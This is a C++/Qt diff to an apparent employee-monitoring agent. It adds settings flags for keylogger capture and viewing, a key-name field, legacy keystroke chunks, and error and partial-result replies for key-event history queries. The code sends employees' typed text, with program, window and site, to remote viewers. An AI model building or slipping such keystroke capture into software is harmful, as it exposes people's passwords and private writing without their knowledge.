@@ -304,15 +304,19 @@ void AgentConnection::sendAgentHellos()
                                          {QStringLiteral("username"), monitor.sessionUsername},
                                          {QStringLiteral("domain"), monitor.sessionDomain},
                                          {QStringLiteral("computer"), monitor.computerName},
-                                         {QStringLiteral("state"), monitor.sessionState}}}});
+                                         {QStringLiteral("state"), monitor.sessionState},
+                                         {QStringLiteral("keyloggerCapture"), m_settings.keyloggerCapture},
+                                         {QStringLiteral("keyloggerView"), m_settings.keyloggerView}}}});
     }
 }
 
 namespace {
 // Events as {"strings":[...], "events":[[moment, type, code, text, app,
-// title, site], ...]}: the program, title and site repeat from one event to
-// the next, so they travel once, as indexes.
-QJsonObject compactKeyEvents(const QJsonArray &events)
+// title, site, name], ...]}: the program, title, site and key name repeat
+// from one event to the next, so they travel once, as indexes. The earlier
+// keylogger's chunks, when given, as "legacy":[[first key or null, saved,
+// text, app, title], ...].
+QJsonObject compactKeyEvents(const QJsonArray &events, const QJsonArray &legacy = QJsonArray())
 {
     QHash<QString, int> index;
     QJsonArray strings;
@@ -333,15 +337,30 @@ QJsonObject compactKeyEvents(const QJsonArray &events)
                                event.value(QStringLiteral("c")).toInt(), event.value(QStringLiteral("x")).toString(),
                                ref(event.value(QStringLiteral("a")).toString()),
                                ref(event.value(QStringLiteral("w")).toString()),
-                               ref(event.value(QStringLiteral("s")).toString())});
+                               ref(event.value(QStringLiteral("s")).toString()),
+                               ref(event.value(QStringLiteral("n")).toString())});
     }
-    return QJsonObject{{QStringLiteral("strings"), strings}, {QStringLiteral("events"), rows}};
+    QJsonObject compact{{QStringLiteral("strings"), strings}, {QStringLiteral("events"), rows}};
+    if (!legacy.isEmpty()) {
+        QJsonArray chunks;
+        for (const QJsonValue &value : legacy) {
+            const QJsonObject chunk = value.toObject();
+            chunks.append(QJsonArray{chunk.value(QStringLiteral("b")), chunk.value(QStringLiteral("e")).toDouble(),
+                                     chunk.value(QStringLiteral("x")).toString(),
+                                     ref(chunk.value(QStringLiteral("a")).toString()),
+                                     ref(chunk.value(QStringLiteral("w")).toString())});
+        }
+        compact.insert(QStringLiteral("strings"), strings);
+        compact.insert(QStringLiteral("legacy"), chunks);
+    }
+    return compact;
 }
 } // namespace
 
 void AgentConnection::pushKeyEvents(quint32 streamId, const QJsonArray &events)
 {
-    if (!m_authenticated || !m_keyEventsCapable || events.isEmpty()) {
+    // v2oKeyloggerEnabled off: viewers get no keys.
+    if (!m_authenticated || !m_keyEventsCapable || !m_settings.keyloggerView || events.isEmpty()) {
         return;
     }
     sendJson(ViewerProtocol::MessageType::KeyEvents, streamId, compactKeyEvents(events));
@@ -586,7 +605,16 @@ void AgentConnection::handleHistoryQuery(const ViewerProtocol::Header &header, c
 
     if (isDeferrableHistoryAction(action)) {
         while (m_deferred.size() >= kMaxDeferredQueries) {
-            m_deferred.dequeue();
+            // A dropped keylogger Selector request is answered with an
+            // error, so the viewer does not wait for it forever.
+            const DeferredQuery dropped = m_deferred.dequeue();
+            if (dropped.request.value(QStringLiteral("action")).toString() == QStringLiteral("listKeyEvents")) {
+                sendJson(ViewerProtocol::MessageType::HistoryQuery, dropped.streamId,
+                        QJsonObject{{QStringLiteral("action"), dropped.request.value(QStringLiteral("action"))},
+                                    {QStringLiteral("tag"), dropped.request.value(QStringLiteral("tag"))},
+                                    {QStringLiteral("error"),
+                                     QStringLiteral("The host had too many requests waiting; this one was dropped.")}});
+            }
         }
         m_deferred.enqueue(DeferredQuery{monitorStreamId, request});
         scheduleDeferredQueries();
@@ -785,13 +813,33 @@ void AgentConnection::runHistoryQuery(quint32 monitorStreamId, const QJsonObject
                             {QStringLiteral("category"), category}});
     } else if (action == QStringLiteral("listKeyEvents")) {
         // SelectKeyboardEvents for [startMs, stopMs) of the employee this
-        // stream belongs to; the tag (the Selector's cookie) comes back.
-        QJsonObject reply = compactKeyEvents(m_historyRecorder->listKeyEvents(
-            m_historyRecorder->usernameForStream(monitorStreamId), rangeStart, rangeStop));
+        // stream belongs to; the tag (the Selector's cookie) comes back,
+        // with the outcome: complete, partial (and why) or an error.
+        if (!m_settings.keyloggerView) {
+            sendJson(ViewerProtocol::MessageType::HistoryQuery, monitorStreamId,
+                    QJsonObject{{QStringLiteral("action"), action},
+                                {QStringLiteral("tag"), request.value(QStringLiteral("tag"))},
+                                {QStringLiteral("disabled"), true},
+                                {QStringLiteral("error"), QStringLiteral("viewer keylogger disabled")}});
+            return;
+        }
+        const HistoryRecorder::KeyEventsResult result = m_historyRecorder->listKeyEvents(
+            m_historyRecorder->usernameForStream(monitorStreamId), rangeStart, rangeStop);
+        if (!result.error.isEmpty()) {
+            sendJson(ViewerProtocol::MessageType::HistoryQuery, monitorStreamId,
+                    QJsonObject{{QStringLiteral("action"), action},
+                                {QStringLiteral("tag"), request.value(QStringLiteral("tag"))},
+                                {QStringLiteral("error"), result.error}});
+            return;
+        }
+        QJsonObject reply = compactKeyEvents(result.events, result.legacy);
         reply.insert(QStringLiteral("action"), action);
         reply.insert(QStringLiteral("day"), day);
         reply.insert(QStringLiteral("tag"), request.value(QStringLiteral("tag")));
-        reply.insert(QStringLiteral("complete"), true);
+        reply.insert(QStringLiteral("complete"), result.complete);
+        if (!result.complete) {
+            reply.insert(QStringLiteral("partialReason"), result.partialReason);
+        }
         sendJson(ViewerProtocol::MessageType::HistoryQuery, monitorStreamId, reply);
     } else if (action == QStringLiteral("listKeystrokes")) {
         quint32 sessionId = 0;
